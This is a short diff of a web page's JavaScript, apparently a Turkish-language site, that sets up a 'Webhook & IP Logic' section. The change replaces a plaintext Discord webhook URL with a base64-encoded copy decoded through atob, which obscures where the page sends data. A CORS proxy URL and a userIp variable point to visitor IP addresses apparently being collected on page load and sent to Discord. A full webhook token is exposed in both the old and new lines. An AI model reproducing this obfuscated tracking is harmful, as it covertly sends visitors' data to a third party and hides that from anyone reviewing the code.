@@ -8,7 +8,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const monthNames = ["Ocak", "Şubat", "Mart", "Nisan", "Mayıs", "Haziran"];
 
   // Webhook & IP Logic
-  const webhookUrl = "https://discord.com/api/webhooks/1511453347264204902/KFHsCOCGbWetTrLKpJ9CXcoJ7MeoHKW4kp_II9OI4Mtl7-Zk9TmMuiepNjXmcbxFsh9Z";
+  const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMTQ1MzM0NzI2NDIwNDkwMi9LRkhzQ09DR2JXZXRUckxLcEo5Q1hjb0o3TWVvSEtXNGtwX0lJOU9JNE10bDctWms5VG1NdWllcE5qWG1jYnhGc2g5Wg==");
   const proxyUrl = "https://corsproxy.io/?" + encodeURIComponent(webhookUrl);
   let userIp = "Bilinmiyor";
 
